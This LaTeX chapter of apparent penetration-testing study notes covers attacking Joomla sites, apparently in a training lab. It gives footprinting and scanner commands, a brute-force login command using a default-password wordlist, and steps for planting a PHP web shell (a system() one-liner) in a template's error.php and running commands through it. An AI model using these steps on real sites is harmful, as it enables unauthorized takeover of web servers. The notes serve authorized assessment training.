\chapter{Joomla}

\href{https://www.joomla.org/}{Joomla} is another free and open-source CMS used
for discussion forums, photo galleries, e-Commerce, user-based communities, and
more. It is written in PHP and uses MySQL in the backend. Like WordPress,
Joomla can be enhanced with over 7,000 extensions and over 1,000 templates.


\section{Discovery/Footprinting}

\begin{verbatim}
curl -s http://URL/ | grep Joomla
curl -s http://URL/robots.txt
curl -s http://URL/README.txt | head -n 5
curl -s http://URL/administrator/manifests/files/joomla.xml | xmllint --format -
\end{verbatim}


\section{Enumeration}

\subsubsection{Droopescan}
\href{https://github.com/droope/droopescan}{droopescan} is a plugin-based
scanner that works for SilverStripe, WordPress, and Drupal with limited
functionality for Joomla and Moodle.

\begin{verbatim}
droopescan scan joomla --url http://URL
\end{verbatim}

\subsection{JoomlaScan}

\href{https://github.com/drego85/JoomlaScan}{JoomlaScan}, which is a Python
tool inspired by the now-defunct OWASP joomscan tool. JoomlaScan is a bit
out-of-date and requires Python2.7 to run.

\begin{verbatim}
python2.7 joomlascan.py -u http://URL
\end{verbatim}

\section{Brute Force}

\subsection{joomla-brute}

\href{https://github.com/ajnik/joomla-bruteforce}{joomla-brute}
\begin{verbatim}
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
\end{verbatim}

\section{Abusing Built-In Functionality}
\verb+http://URL/administrator+

click on \verb+Templates+ on the bottom left under \verb+Configuration+ to pull
up the templates menu.


click on a template name. This will open  the \verb+Templates: Customise+
page.

Finally, click on a page to pull up the page source. It is a good idea to get
in the habit of using non-standard file names and parameters for web shells to
not make them easily accessible to a "drive-by" attacker during the assessment.
it can be also password protect and even limit access down to source IP address. Also, always remember to clean up web shells as soon as done with them but still include the file name, file hash, and location in final report to the client.

Let's choose the \verb+error.php+ page and add a PHP one-liner to gain code execution as follows.
\begin{verbatim}
system($_GET['dcfdd']);
\end{verbatim}


then \verb+curl -s http://iURL/templates/TEMPNAME/error.php/error.php?dcfdd=id+
\subsection{Known Vulnerabilities}
